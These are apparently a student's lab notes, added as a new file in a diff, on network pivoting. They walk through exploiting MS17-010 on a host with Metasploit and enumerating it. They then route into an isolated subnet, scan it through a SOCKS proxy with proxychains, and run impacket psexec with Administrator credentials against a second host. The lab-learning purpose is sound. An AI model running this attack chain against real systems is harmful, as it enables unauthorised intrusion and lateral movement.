@@ -1,0 +1,125 @@
+
+Pivot part1
+
+nmap -sC-sV -O 192.168.10.11 -oA default-script-scan
+
+msfconsole
+ search smb_version type:auxiliary
+  - use 0
+  - set RHOSTS
+  - run
+
+locate *smb*.nse | grep vuln
+
+nmap --script smb-vuln-ms17-010.nse -p445 192.168.10.11
+ - VULNERABLE to ms17-010
+
+Verify if it is true:
+  search ms17-010 type:auxiliary
+   - use 1
+   - set RHOSTS
+   - run
+
+If the vulnerability is true:
+  search ms17-010 type:exploit
+   - use 0
+   - set RHOSTS
+   - set LHOSTS
+   - set LPORT (4445)
+   - exploit
+
+Basic enumeration:
+shell
+hostname
+whoami
+systeminfo
+netstat -an (network information)
+tasklist (list of tasks running)
+exit
+meterpreter: getpid (to see the pid used by meterpreter to exploit)
+shell
+tasklist | findstr 240
+ - spoolsv.exe
+ipconfig
+ - there are 2 networks
+arp -a
+ - check the ip of the machine that is currently connected to machine earl
+   - type: dynamic
+
+route print
+
+In this part of the lab,we were able to gain initial foothold of amachine that has access to an isolated network. We were able to enumerate the compromised host as well. In the next part of the lab, we will add a route to that network and perform a scan using Nmap and MSF module.
+
+
+Pivot part2
+Lab Goals:
+- Perform pivoting on a host inthe isolated network
+- Be familiar with Proxychains and Socksserver
+
+set metasploit to run in background:
+ - exit
+ - background (session 1)
+
+add route to the session:
+ - route add 192.168.11.0 255.255.255.0 1
+ - route print (view it)
+
+Network scan in metasploit (able to see the host ip of both earl and cardinal):
+ - search arp type:post
+   - use 1
+   - set RHOSTS (newly added network)
+   - set SESSION 1
+   - run
+
+Host Discoveryusing UDP Scan:
+ - use auxiliary/scanner/discovery/udp_probe
+ - options
+ - set RHOSTS (newly added network)
+ - run
+Result:
+[+] Discovered NetBIOS on 192.168.11.10:137 (EARL:<00>:U :WORKGROUP:<00>:G :EARL:<20>:U :WORKGROUP:<1e>:G :00:0c:29:0a:02:57)
+[+] Discovered NetBIOS on 192.168.11.11:137 (CARDINAL:<20>:U :CARDINAL:<00>:U :WORKGROUP:<00>:G :WORKGROUP:<1e>:G :WORKGROUP:<1d>:U :__MSBROWSE__:<01>:G :00:0c:29:00:fd:5e)
+
+Perform a port-scan using a Metasploitmodule:
+ - search portscan type:auxiliary
+  - use 5 (auxiliary/scanner/portscan/tcp)
+  - set RHOSTS (ip of cardinal)
+  - set THREADS 100 
+  - set PORTS 21,22,23,25,80,110,135,139,143,443,445,3389,3306
+  - run
+
+  Scanning all ports will take a lot of time because ourscan passes through a pivothost. We only selected the most common ports.
+
+Nmap using Proxychains and Socks5:
+Let’s now generatetraffic from a separate Kaliterminal to test that we don’t have direct connection yet from Kali to the newly discovered host at 192.168.11.11
+ - nmap -Pn -sT -p139,445 192.168.11.11
+ - nmap could not get any connection to the 192.168.11.11 yet
+
+Setup up the proxy server in Metasploit:
+ - search socks
+   - use 0 (auxiliary/server/socks_proxy)
+   - info
+   - options
+   - set SRVHOST (kali ip)
+   - set SRVPORT 1080 (default)
+Run Netstat in another Kali terminal to verify that port 1080 is not listening yet:
+ - netstat -antp
+   - exploit -j
+
+Verify it now:
+  - netstat -antp (listening kali ip in port 1080)
+
+Proxychains:
+We will use and configure Proxychains, so we can send our traffic using it, forward the traffic through the Socksproxyserver then to the remote IP of 192.168.11.11
+  - proxychains nmap -Pn -sT -p139,445 192.168.11.11
+     - services are closed
+  - cat /etc/proxychains.conf
+  - change socks4 127.0.0.1 9050 - socks5 <kali-ip> 1080
+  - proxychains nmap -Pn -sT -p139,445 192.168.11.11
+     - services are now open
+  - sudo proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator:password@192.168.11.11 cmd
+
+look where psexec.py is located (locate psexec.py)
+
+Conclusion:
+We were able to access the host located in the 192.168.11.0/24network. We also performed different scans to that isolated network through the pivot host(Earl). Lastly, we discussed tools such as Proxychains and Socks Metasploit modules.
